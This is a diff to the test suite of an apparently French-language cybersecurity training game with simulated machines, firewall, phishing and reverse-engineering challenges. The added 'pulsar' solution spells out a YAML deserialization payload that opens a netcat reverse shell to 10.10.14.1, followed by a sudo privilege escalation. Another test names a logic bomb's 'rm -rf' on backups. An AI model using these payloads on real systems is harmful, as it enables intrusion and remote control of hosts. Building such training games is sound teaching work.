@@ -269,6 +269,17 @@ const MACHINE_SOLUTIONS = {
     run(ctx, "!sh");
     return run(ctx, "cat /root/root.txt");
   },
+  pulsar: (ctx) => {
+    run(ctx, "exit"); // pour attraper le callback, être sur sa propre box
+    run(ctx, "nmap 10.10.11.55");
+    run(ctx, "curl http://10.10.11.55:9090/");
+    run(ctx, "nc -lvnp 4444");
+    run(ctx, 'curl -d \'!!python/object/apply:os.system ["nc 10.10.14.1 4444 -e /bin/sh"]\' http://10.10.11.55:9090/api/config/import');
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo timeout 7d /bin/sh");
+    return run(ctx, "cat /root/root.txt");
+  },
   parallax: (ctx) => {
     run(ctx, "nmap 10.10.11.170");
     run(ctx, "curl http://10.10.11.170/");
@@ -314,11 +325,11 @@ const MACHINE_SOLUTIONS = {
   },
 };
 
-section("Machines : recon -> accès -> privesc -> flags (les 17 machines)", () => {
+section("Machines : recon -> accès -> privesc -> flags (les 18 machines)", () => {
   const ctx = freshContext();
   unlockAll(ctx);
   const machines = get(ctx, "MACHINES");
-  assertEqual(machines.length, 17, "17 machines définies dans MACHINES");
+  assertEqual(machines.length, 18, "18 machines définies dans MACHINES");
 
   let totalScoreCheck = 0;
   for (const m of machines) {
@@ -333,11 +344,11 @@ section("Machines : recon -> accès -> privesc -> flags (les 17 machines)", () =
   }
 
   const finalScore = get(ctx, "GAME.score");
-  // 17 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 17 * 800 = 13600
-  assertEqual(finalScore, 13600, "score total cohérent après les 17 machines (100+150+250+100+200 par machine)");
+  // 18 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 18 * 800 = 14400
+  assertEqual(finalScore, 14400, "score total cohérent après les 18 machines (100+150+250+100+200 par machine)");
 
   const badges = get(ctx, "GAME.badges");
-  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 17 machines");
+  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 18 machines");
 });
 
 section("Lore transversal : note_interne.txt présent sur chaque machine sans fausser le score", () => {
@@ -1115,7 +1126,14 @@ section("Pare-feu simulé : iptables (lecture/écriture de règles)", () => {
   run(ctx, "iptables -I INPUT 1 -s 203.0.113.66 -j DROP");
   assert(get(ctx, "GAME.firewall.solved['fw-block']"), "insérer le DROP en tête bloque l'attaquant sans couper le web");
 
-  assertEqual(get(ctx, "GAME.score"), scoreBefore + 400, "les deux scénarios créditent leurs points");
+  // Scénario 3 : corriger une règle trop permissive (port DB ouvert à tout le monde par erreur)
+  run(ctx, "firewall fw-dmz");
+  assert(!get(ctx, "GAME.firewall.solved['fw-dmz']"), "fw-dmz pas résolu tel quel (la règle 5432 initiale est trop permissive)");
+  run(ctx, "iptables -D INPUT 3"); // supprime la règle 5432 -s any trop permissive
+  run(ctx, "iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.20 -j ACCEPT");
+  assert(get(ctx, "GAME.firewall.solved['fw-dmz']"), "fw-dmz résolu (web ouvert, Postgres restreint au serveur applicatif)");
+
+  assertEqual(get(ctx, "GAME.score"), scoreBefore + 620, "les trois scénarios créditent leurs points (200+200+220)");
   assertEqual(get(ctx, "GAME.badges.firewall_complete"), true, "badge Ingénieur réseau débloqué");
 
   // Pas de double crédit
@@ -1155,7 +1173,17 @@ section("Chapitre phishing : analyse de mails", () => {
   run(ctx, "report mail-invoice indice piece jointe .exe (double extension)");
   assert(get(ctx, "GAME.phishing.solved['mail-invoice']"), "le mail avec pièce jointe .exe est traité");
 
-  assertEqual(get(ctx, "GAME.score"), scoreBefore + 400, "les 3 mails créditent leurs points (100+150+150)");
+  // Mail légitime n°2 (notification d'outil, aucun indicateur suspect) : un seul verdict suffit
+  run(ctx, "report mail-vendor verdict legitime");
+  assert(get(ctx, "GAME.phishing.solved['mail-vendor']"), "la notification de ticket légitime est traitée");
+
+  // Fraude au président (BEC) : verdict + indicateur (typosquat du domaine)
+  run(ctx, "report mail-ceo verdict phishing");
+  assert(!get(ctx, "GAME.phishing.solved['mail-ceo']"), "le verdict seul ne suffit pas pour la fraude au président non plus");
+  run(ctx, "report mail-ceo indice le domaine solenne-holdlngs.com est un typosquat");
+  assert(get(ctx, "GAME.phishing.solved['mail-ceo']"), "verdict + indicateur résolvent la fraude au président");
+
+  assertEqual(get(ctx, "GAME.score"), scoreBefore + 675, "les 5 mails créditent leurs points (100+150+150+100+175)");
   assertEqual(get(ctx, "GAME.badges.phishing_complete"), true, "badge Anti-hameçonnage débloqué");
 
   const now = get(ctx, "GAME.score");
@@ -1219,7 +1247,13 @@ section("Reverse engineering : strings / disas / resolve", () => {
   run(ctx, "resolve authcheck faille clé comparée en dur (strcmp)");
   assert(get(ctx, "GAME.reverse.solved['authcheck']"), "authcheck résolu (clé + faille)");
 
-  assertEqual(get(ctx, "GAME.score"), scoreBefore + 350, "les 2 échantillons créditent leurs points (200+150)");
+  // timebomb : bombe logique déclenchée par une constante epoch
+  run(ctx, "resolve timebomb trigger 1893456000");
+  run(ctx, "resolve timebomb action rm -rf sur les backups");
+  run(ctx, "resolve timebomb nature bombe logique");
+  assert(get(ctx, "GAME.reverse.solved['timebomb']"), "timebomb résolu (constante + action + nature)");
+
+  assertEqual(get(ctx, "GAME.score"), scoreBefore + 525, "les 3 échantillons créditent leurs points (200+150+175)");
   assertEqual(get(ctx, "GAME.badges.reverse_complete"), true, "badge Reverse engineer débloqué");
 
   const now = get(ctx, "GAME.score");
@@ -1391,6 +1425,68 @@ section("i18n moteur : messages bilingues", () => {
   assert(get(ctxEn, "bilang('a','b')") === "b", "bilang() renvoie l'anglais quand LANG='en'");
   // repli : sans LANG défini, tout reste en français
   assert(get(ctxFr, "bilang('a','b')") === "a", "bilang() retombe sur le français sans LANG");
+
+  // Complétude : chaque machine doit avoir un briefing EN (pas de repli silencieux sur le FR en mode EN)
+  const machineIds = get(ctxFr, "MACHINES.map(m => m.id)");
+  const briefingEnKeys = get(ctxFr, "Object.keys(BRIEFING_EN)");
+  for (const id of machineIds) {
+    assert(briefingEnKeys.includes(id), `BRIEFING_EN contient une traduction pour ${id}`);
+  }
+});
+
+// ── 32. Badge capstone : Grand chelem (100% du jeu, tous modes confondus) ────
+section("Badge Grand chelem : tous les badges de complétion réunis", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+
+  // 1) Toutes les machines
+  for (const m of get(ctx, "MACHINES")) {
+    run(ctx, `use ${m.id}`);
+    MACHINE_SOLUTIONS[m.id](ctx);
+  }
+  assertEqual(get(ctx, "GAME.badges.completionist"), true, "prérequis : completionist");
+
+  // 2) Tous les défis Jeopardy
+  for (const c of get(ctx, "CHALLENGES")) run(ctx, `submit ${c.id} ${c.answer}`);
+  assertEqual(get(ctx, "GAME.badges.jeopardy_complete"), true, "prérequis : jeopardy_complete");
+
+  // 3) Tous les incidents Blue Team
+  for (const inc of get(ctx, "BLUE_INCIDENTS")) {
+    for (const q of inc.questions) run(ctx, `answer ${inc.id} ${q.id} ${q.accept[0]}`);
+  }
+  assertEqual(get(ctx, "GAME.badges.blueteam_complete"), true, "prérequis : blueteam_complete");
+
+  // 4) Tous les scénarios de pare-feu (pas génériques : logique dédiée par scénario)
+  run(ctx, "firewall fw-harden");
+  run(ctx, "iptables -P INPUT DROP");
+  run(ctx, "iptables -A INPUT -p tcp --dport 80 -j ACCEPT");
+  run(ctx, "iptables -A INPUT -p tcp --dport 443 -j ACCEPT");
+  run(ctx, "iptables -A INPUT -s 10.0.0.0/8 -p tcp --dport 22 -j ACCEPT");
+  run(ctx, "firewall fw-block");
+  run(ctx, "iptables -I INPUT 1 -s 203.0.113.66 -j DROP");
+  run(ctx, "firewall fw-dmz");
+  run(ctx, "iptables -D INPUT 3");
+  run(ctx, "iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.20 -j ACCEPT");
+  assertEqual(get(ctx, "GAME.badges.firewall_complete"), true, "prérequis : firewall_complete");
+
+  // 5) Tous les mails phishing (même mécanique générique que Blue Team : report <id> <q.id> <accept[0]>)
+  for (const m of get(ctx, "PHISH_MAILS")) {
+    for (const q of m.questions) run(ctx, `report ${m.id} ${q.id} ${q.accept[0]}`);
+  }
+  assertEqual(get(ctx, "GAME.badges.phishing_complete"), true, "prérequis : phishing_complete");
+
+  // 6) Tous les échantillons de reverse engineering
+  for (const s of get(ctx, "MALWARE_SAMPLES")) {
+    for (const q of s.questions) run(ctx, `resolve ${s.id} ${q.id} ${q.accept[0]}`);
+  }
+  assertEqual(get(ctx, "GAME.badges.reverse_complete"), true, "prérequis : reverse_complete");
+
+  // 7) Le défi buffer overflow
+  get(ctx, "attemptStack(24, '0x401156')");
+  assertEqual(get(ctx, "GAME.badges.stackpwn_complete"), true, "prérequis : stackpwn_complete");
+
+  // Le badge capstone doit maintenant être débloqué, tous ses prérequis étant réunis
+  assertEqual(get(ctx, "GAME.badges.grand_chelem"), true, "👑 badge Grand chelem débloqué : 100% du jeu, tous modes confondus");
 });
 
 // ── Rapport final ─────────────────────────────────────────────────────────────
